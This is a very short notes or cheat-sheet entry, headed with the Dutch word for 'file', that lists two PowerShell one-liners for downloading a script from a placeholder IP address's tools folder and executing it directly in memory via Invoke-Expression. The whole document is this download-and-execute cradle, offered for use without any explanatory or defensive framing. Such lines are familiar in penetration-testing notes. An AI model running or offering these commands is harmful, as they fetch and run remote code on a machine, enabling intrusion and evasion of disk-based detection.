## [bestand]
IEX(New-Object Net.WebClient).downloadString('http://[ip]/tools/[bestand]')
Invoke-WebRequest https://[ip]/tools/[bestand] | Invoke-Expression